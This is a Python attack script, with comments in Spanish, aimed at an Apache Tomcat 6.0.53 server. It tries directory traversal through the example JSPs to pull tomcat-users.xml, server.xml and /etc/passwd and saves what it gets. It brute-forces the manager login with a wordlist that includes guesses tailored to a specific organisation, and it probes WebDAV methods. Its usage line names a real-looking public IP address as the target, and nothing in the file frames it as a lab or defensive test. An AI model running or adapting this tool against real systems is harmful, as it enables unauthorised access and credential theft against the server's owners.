import requests
import sys
import urllib3
from urllib.parse import quote, urljoin

# Desactivar warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AggressiveTomcatExploiter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; Tomcat-Exploit/1.0)'
        })
    
    def aggressive_directory_traversal(self):
        """Ataque agresivo de Directory Traversal"""
        print("[+] Ataque agresivo de Directory Traversal...")
        
        # URLs de ejemplos vulnerables en Tomcat 6
        base_paths = [
            '/examples/jsp/include/include.jsp',
            '/examples/jsp/cal/cal2.jsp', 
            '/examples/servlets/servlet/SnoopServlet',
            '/examples/jsp/error/error.jsp'
        ]
        
        # Archivos objetivo
        target_files = [
            '../../../../conf/tomcat-users.xml',
            '../../../../conf/server.xml',
            '../../../../webapps/manager/WEB-INF/web.xml',
            '../../../../WEB-INF/web.xml',
            '../../../../windows/win.ini',
            '../../../../etc/passwd',
            '../conf/tomcat-users.xml',
            '..\\..\\..\\..\\conf\\tomcat-users.xml'
        ]
        
        for base_path in base_paths:
            for target_file in target_files:
                # Diferentes parámetros de traversal
                params = {
                    'page': target_file,
                    'file': target_file,
                    'path': target_file,
                    'url': target_file,
                    'time': target_file,
                    'param': target_file,
                    'include': target_file
                }
                
                for param_name, param_value in params.items():
                    try:
                        if '?' in base_path:
                            url = f"{self.target}{base_path}&{param_name}={quote(param_value)}"
                        else:
                            url = f"{self.target}{base_path}?{param_name}={quote(param_value)}"
                        
                        response = self.session.get(url, timeout=10, verify=False)
                        
                        # Verificar si encontramos contenido sensible
                        if response.status_code == 200:
                            content = response.text
                            
                            # Detectar archivos específicos
                            if 'tomcat-users' in content and 'password' in content:
                                print(f"[CRITICAL] tomcat-users.xml EXPUESTO!")
                                print(f"URL: {url}")
                                self.save_file('tomcat-users.xml', content)
                                return content
                                
                            elif 'server.xml' in content or 'Service' in content:
                                print(f"[CRITICAL] server.xml EXPUESTO!")
                                self.save_file('server.xml', content)
                                
                            elif 'web.xml' in content and 'web-app' in content:
                                print(f"[CRITICAL] web.xml EXPUESTO!")
                                self.save_file('web.xml', content)
                                
                            elif 'root:' in content or 'nobody:' in content:
                                print(f"[CRITICAL] /etc/passwd EXPUESTO!")
                                self.save_file('etc_passwd.txt', content)
                        
                    except Exception as e:
                        continue
        
        print("[-] Directory Traversal no exitoso con métodos convencionales")
        return None
    
    def save_file(self, filename, content):
        """Guardar archivo extraído"""
        with open(filename, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(content)
        print(f"[+] Archivo guardado como: {filename}")
    
    def exploit_jsp_samples_directly(self):
        """Acceder directamente a los JSP samples"""
        print("\n[+] Accediendo a JSP samples directamente...")
        
        jsp_samples = [
            '/examples/jsp/jsp2/tagfiles/hello.jsp',
            '/examples/jsp/include/include.jsp',
            '/examples/jsp/snp/snoop.jsp',
            '/examples/jsp/colors/colors.jsp'
        ]
        
        for jsp in jsp_samples:
            try:
                url = f"{self.target}{jsp}"
                response = self.session.get(url, timeout=8, verify=False)
                
                if response.status_code == 200:
                    print(f"[+] JSP Sample accesible: {jsp}")
                    
                    # Buscar información en la respuesta
                    if 'snoop' in jsp:
                        print("   SnoopJSP - Puede mostrar información del servidor")
                        if 'JSP' in response.text:
                            print("   Contiene información del servidor")
                    
            except Exception as e:
                print(f"[-] Error en {jsp}: {e}")
    
    def brute_force_with_wider_list(self):
        """Fuerza bruta con lista más amplia"""
        print("\n[+] Fuerza bruta ampliada...")
        
        # Lista MUY ampliada de credenciales
        users = ['admin', 'tomcat', 'manager', 'root', 'both', 'role1', 'role', 
                'hnieto', 'sito', 'misitio', 'utslp', 'administrator', 'webmaster',
                'test', 'demo', 'guest', 'user', 'operator', 'supervisor']
        
        passwords = ['', 'admin', 'tomcat', 'manager', 'password', '123456', '1234',
                   '12345', '12345678', '123456789', 'admin123', 'tomcat6', 
                   'tomcat6.0', 'tomcat60', 'utslp', 'utslp.edu.mx', 'sito',
                   'misitio', 'hnieto', 'password123', 'Passw0rd', 'P@ssw0rd',
                   'changeme', 'default', 'letmein', 'welcome', 'secret']
        
        for user in users:
            for password in passwords:
                try:
                    url = f"{self.target}/manager/html"
                    response = self.session.get(url, auth=(user, password), timeout=5, verify=False)
                    
                    if response.status_code == 200 and 'Tomcat' in response.text:
                        print(f"[CRITICAL] CREDENCIALES VÁLIDAS: {user}:{password}")
                        return (user, password)
                    else:
                        print(f"[-] Falló: {user}:{password}")
                        
                except Exception as e:
                    continue
        
        return None
    
    def test_webdav_methods(self):
        """Probar métodos WebDAV"""
        print("\n[+] Probando métodos WebDAV...")
        
        methods = ['PUT', 'DELETE', 'PROPFIND', 'MKCOL', 'COPY', 'MOVE']
        
        for method in methods:
            try:
                response = self.session.request(method, self.target, timeout=5, verify=False)
                print(f"WebDAV {method}: HTTP {response.status_code}")
            except Exception as e:
                print(f"WebDAV {method}: Error - {e}")
    
    def comprehensive_attack(self):
        """Ataque completo"""
        print("=== ATAQUE AGRESIVO TOMCAT 6.0.53 ===")
        print(f"Objetivo: {self.target}\n")
        
        # 1. Directory Traversal agresivo
        self.aggressive_directory_traversal()
        
        # 2. JSP Samples
        self.exploit_jsp_samples_directly()
        
        # 3. Fuerza bruta ampliada
        self.brute_force_with_wider_list()
        
        # 4. WebDAV
        self.test_webdav_methods()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python aggressive_exploit.py http://189.254.143.102")
        sys.exit(1)
    
    target = sys.argv[1]
    exploiter = AggressiveTomcatExploiter(target)
    exploiter.comprehensive_attack()